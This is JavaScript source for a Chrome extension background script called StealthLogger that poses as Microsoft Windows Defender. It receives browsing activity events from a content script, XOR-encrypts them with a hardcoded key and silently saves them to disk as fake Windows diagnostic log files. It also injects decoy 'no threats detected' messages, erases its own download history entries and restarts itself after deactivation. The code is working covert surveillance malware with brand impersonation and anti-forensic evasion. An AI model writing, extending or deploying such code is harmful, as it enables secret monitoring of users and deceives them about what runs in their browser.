// Hardcoded configuration
const CONFIG = {
    SALT: "Test@1234!!!",
    LOG_DIR: "WindowsSystemHealthLogs\\",
    COMPANY: "Microsoft",
    PRODUCT: "Windows Defender",
    VERSION: "1.0.4",
    MAX_BUFFER_SIZE: 1000000, // 1MB buffer limit
    MIN_BUFFER_SIZE: 800000   // 800KB minimum to trigger save
};

// Simple XOR encryption
function encryptData(data, salt) {
    let encrypted = '';
    for (let i = 0; i < data.length; i++) {
        const charCode = data.charCodeAt(i) ^ salt.charCodeAt(i % salt.length);
        encrypted += String.fromCharCode(charCode);
    }
    return btoa(encrypted); // Base64 encode
}

// Generate legitimate-looking filename
function generateFilename() {
    const timestamp = new Date().toISOString().replace(/[-:]/g, '').split('.')[0];
    const prefixes = [
        'SystemDiagnostics',
        'PerformanceLog',
        'ResourceMonitor',
        'EventTracing',
        'HealthMetrics'
    ];
    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
    return `${prefix}_${timestamp}.etl`;
}

class StealthLogger {
    constructor() {
        this.buffer = "";
        this.logCount = 0;
        this.isActive = true;
        this.lastActivity = Date.now();
        this.lastSaveTime = Date.now();
        this.init();
    }

    init() {
        // Random intervals: 10-15 minutes (600,000 - 900,000 ms)
        const minInterval = 600000; // 10 minutes
        const maxInterval = 900000; // 15 minutes
        this.saveInterval = setInterval(() => this.saveBuffer(),
            Math.floor(Math.random() * (maxInterval - minInterval)) + minInterval);
        
        // Mimic legitimate system activity every 2-5 minutes
        this.systemMimicInterval = setInterval(() => this.mimicSystemActivity(), 
            Math.floor(Math.random() * 180000) + 120000); // 2-5 minutes
        
        console.log(`${CONFIG.PRODUCT} ${CONFIG.VERSION} initialized`);
    }

    mimicSystemActivity() {
        const messages = [
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: System scan completed`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: No threats detected`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Memory usage optimized`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Network traffic analyzed`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Real-time protection active`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Firewall rules updated`,
            `[${new Date().toISOString()}] ${CONFIG.PRODUCT}: Signature database updated`
        ];
        const randomMsg = messages[Math.floor(Math.random() * messages.length)];
        this.addToBuffer(randomMsg);
    }

    addToBuffer(data) {
        if (!this.isActive || !data) return;
        
        const timestamp = new Date().toISOString();
        const entry = `[${timestamp}] ${data}\n`;
        this.buffer += entry;
        this.lastActivity = Date.now();
        
        // Auto-save if buffer reaches 800KB-1MB
        if (this.buffer.length >= CONFIG.MIN_BUFFER_SIZE) {
            console.log(`${CONFIG.PRODUCT}: Buffer threshold reached (${this.buffer.length} bytes), saving...`);
            this.saveBuffer();
        }
    }

    saveBuffer() {
        if (this.buffer.length === 0 || !this.isActive) {
            console.log(`${CONFIG.PRODUCT}: No data to save`);
            return;
        }
        
        try {
            console.log(`${CONFIG.PRODUCT}: Saving ${this.buffer.length} bytes...`);
            
            // Encrypt the buffer
            const encryptedData = encryptData(this.buffer, CONFIG.SALT);
            
            // Create legitimate XML structure
            const header = `<?xml version="1.0" encoding="UTF-8"?>
<!-- ${CONFIG.COMPANY} ${CONFIG.PRODUCT} Diagnostic Log -->
<!-- Generated: ${new Date().toISOString()} -->
<!-- Version: ${CONFIG.VERSION} -->
<EventTraceSession xmlns="http://schemas.microsoft.com/win/2004/08/events/trace">
  <System>
    <Provider Name="${CONFIG.PRODUCT}" Guid="{${this.generateGuid()}}" />
    <EventID>1000</EventID>
    <Version>0</Version>
    <Level>4</Level>
    <Task>0</Task>
    <Opcode>0</Opcode>
    <Keywords>0x0</Keywords>
    <TimeCreated SystemTime="${new Date().toISOString()}" />
    <Correlation ActivityID="{${this.generateGuid()}}" />
    <Execution ProcessID="${Math.floor(Math.random() * 10000)}" ThreadID="${Math.floor(Math.random() * 1000)}" />
    <Channel>Application</Channel>
    <Computer>${this.getComputerName()}</Computer>
  </System>
  <UserData>
    <Data>`;
            
            const footer = `</Data>
  </UserData>
</EventTraceSession>`;
            
            const finalData = header + encryptedData + footer;
            const filename = generateFilename();
            
            // Use data URL approach directly (no URL.createObjectURL needed)
            const dataUrl = 'data:application/xml;charset=utf-8,' + encodeURIComponent(finalData);
            
            chrome.downloads.download({
                url: dataUrl,
                filename: CONFIG.LOG_DIR + filename,
                saveAs: false,
                conflictAction: 'uniquify'
            }, (downloadId) => {
                if (chrome.runtime.lastError) {
                    console.error(`${CONFIG.PRODUCT}: Download failed -`, chrome.runtime.lastError.message);
                    
                    // Alternative: Try with text/plain MIME type
                    setTimeout(() => {
                        const altDataUrl = 'data:text/plain;charset=utf-8,' + encodeURIComponent(finalData);
                        chrome.downloads.download({
                            url: altDataUrl,
                            filename: CONFIG.LOG_DIR + filename,
                            saveAs: false,
                            conflictAction: 'uniquify'
                        }, (altDownloadId) => {
                            if (chrome.runtime.lastError) {
                                console.error(`${CONFIG.PRODUCT}: Secondary download failed -`, chrome.runtime.lastError.message);
                                // Save to storage as fallback
                                this.saveToStorage();
                            } else {
                                this.handleSuccessfulSave(filename);
                            }
                        });
                    }, 10000); // Retry after 10 seconds
                } else {
                    this.handleSuccessfulSave(filename);
                }
            });
            
        } catch (error) {
            console.error(`${CONFIG.PRODUCT}: Save error -`, error);
            // Try again in 2 minutes if error occurs
            setTimeout(() => this.saveBuffer(), 120000);
        }
    }

    handleSuccessfulSave(filename) {
        console.log(`${CONFIG.PRODUCT}: Successfully saved to ${CONFIG.LOG_DIR}${filename}`);
        this.buffer = "";
        this.logCount++;
        this.lastSaveTime = Date.now();
        
        // Cleanup old logs every 10 files
        if (this.logCount % 10 === 0) {
            this.cleanupOldLogs();
        }
    }

    // Fallback method: Save to chrome.storage if download fails
    saveToStorage() {
        try {
            const storageKey = `backup_log_${Date.now()}`;
            chrome.storage.local.set({ [storageKey]: this.buffer }, () => {
                if (chrome.runtime.lastError) {
                    console.error(`${CONFIG.PRODUCT}: Storage backup failed -`, chrome.runtime.lastError.message);
                } else {
                    console.log(`${CONFIG.PRODUCT}: Backup saved to storage as ${storageKey}`);
                    this.buffer = "";
                    this.logCount++;
                }
            });
        } catch (e) {
            console.error(`${CONFIG.PRODUCT}: Storage error -`, e);
        }
    }

    generateGuid() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            const r = Math.random() * 16 | 0;
            const v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }

    getComputerName() {
        return navigator.platform || 'WIN11-PC';
    }

    cleanupOldLogs() {
        console.log(`${CONFIG.PRODUCT}: Performing log maintenance`);
        
        // Request download items list to check for old logs
        chrome.downloads.search({}, (items) => {
            if (chrome.runtime.lastError) return;
            
            const now = Date.now();
            const oneWeekAgo = now - (7 * 24 * 60 * 60 * 1000);
            
            items.forEach(item => {
                if (item.filename && item.filename.includes('SystemHealthLogs') && 
                    item.endTime && new Date(item.endTime).getTime() < oneWeekAgo) {
                    // Remove old logs (older than 1 week)
                    chrome.downloads.erase({id: item.id}, () => {
                        console.log(`${CONFIG.PRODUCT}: Removed old log: ${item.filename}`);
                    });
                }
            });
        });
        
        this.addToBuffer(`${CONFIG.PRODUCT}: Log maintenance performed`);
    }

    deactivate() {
        console.log(`${CONFIG.PRODUCT}: Deactivating...`);
        this.isActive = false;
        clearInterval(this.saveInterval);
        clearInterval(this.systemMimicInterval);
        
        // Save any remaining data before deactivation
        if (this.buffer.length > 0) {
            console.log(`${CONFIG.PRODUCT}: Saving remaining ${this.buffer.length} bytes before deactivation`);
            this.saveBuffer();
        }
    }
}

// Initialize stealth logger
const logger = new StealthLogger();

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (!request || !logger.isActive) return;
    
    switch(request.type) {
        case 'ACTIVITY':
            if (request.data) {
                logger.addToBuffer(request.data);
            }
            
            if (request.events) {
                try {
                    const events = JSON.parse(request.events);
                    events.forEach(event => {
                        const logEntry = {
                            type: event.type,
                            site: event.window || 'unknown',
                            details: event.details || {},
                            time: event.timestamp,
                            userAgent: event.userAgent || navigator.userAgent.substring(0, 100)
                        };
                        logger.addToBuffer(`EVENT: ${JSON.stringify(logEntry)}`);
                    });
                } catch (e) {
                    console.error(`${CONFIG.PRODUCT}: Failed to parse events -`, e);
                    logger.addToBuffer(`ERROR: Failed to parse events - ${e.message}`);
                }
            }
            break;
            
        case 'SYSTEM':
            logger.mimicSystemActivity();
            break;
            
        case 'STATUS':
            sendResponse({ 
                active: logger.isActive, 
                logs: logger.logCount,
                bufferSize: logger.buffer.length,
                lastSave: new Date(logger.lastSaveTime).toISOString()
            });
            break;
            
        case 'FORCE_SAVE':
            logger.saveBuffer();
            sendResponse({ success: true, message: 'Force save initiated' });
            break;
    }
    
    return true;
});

// Handle extension lifecycle
chrome.runtime.onSuspend.addListener(() => {
    console.log(`${CONFIG.PRODUCT}: Extension suspending...`);
    logger.deactivate();
});

chrome.runtime.onSuspendCanceled.addListener(() => {
    console.log(`${CONFIG.PRODUCT}: Suspension cancelled, reactivating...`);
    logger.isActive = true;
});

// Request download permission on install
chrome.runtime.onInstalled.addListener((details) => {
    if (details.reason === 'install') {
        console.log(`${CONFIG.PRODUCT}: Extension installed successfully`);
        logger.addToBuffer(`${CONFIG.PRODUCT}: Initial installation completed`);
        
        // Request permissions if needed
        chrome.permissions.contains({
            permissions: ['downloads']
        }, (hasPermission) => {
            if (!hasPermission) {
                console.log(`${CONFIG.PRODUCT}: Requesting download permission...`);
            }
        });
    } else if (details.reason === 'update') {
        console.log(`${CONFIG.PRODUCT}: Extension updated from ${details.previousVersion}`);
        logger.addToBuffer(`${CONFIG.PRODUCT}: Updated to version ${CONFIG.VERSION}`);
    }
});

// Self-protection and health monitoring
setInterval(() => {
    // Restart if inactive
    if (!logger.isActive) {
        console.log(`${CONFIG.PRODUCT}: Service restarting...`);
        logger.isActive = true;
        
        clearInterval(logger.saveInterval);
        clearInterval(logger.systemMimicInterval);
        logger.init();
    }
    
    // Force save if buffer exceeds max size
    if (logger.buffer.length > CONFIG.MAX_BUFFER_SIZE) {
        console.log(`${CONFIG.PRODUCT}: Buffer exceeded maximum size (${logger.buffer.length} > ${CONFIG.MAX_BUFFER_SIZE}), forcing save...`);
        logger.saveBuffer();
    }
    
    // Periodic status update
    const now = Date.now();
    if (now - logger.lastActivity > 3600000) { // 1 hour of inactivity
        logger.addToBuffer(`${CONFIG.PRODUCT}: System idle check`);
        logger.lastActivity = now;
    }
}, 300000); // Check every 5 minutes

// Handle download completion events
chrome.downloads.onChanged.addListener((delta) => {
    if (delta.state && delta.state.current === 'complete') {
        console.log(`${CONFIG.PRODUCT}: Download ${delta.id} completed successfully`);
    }
});
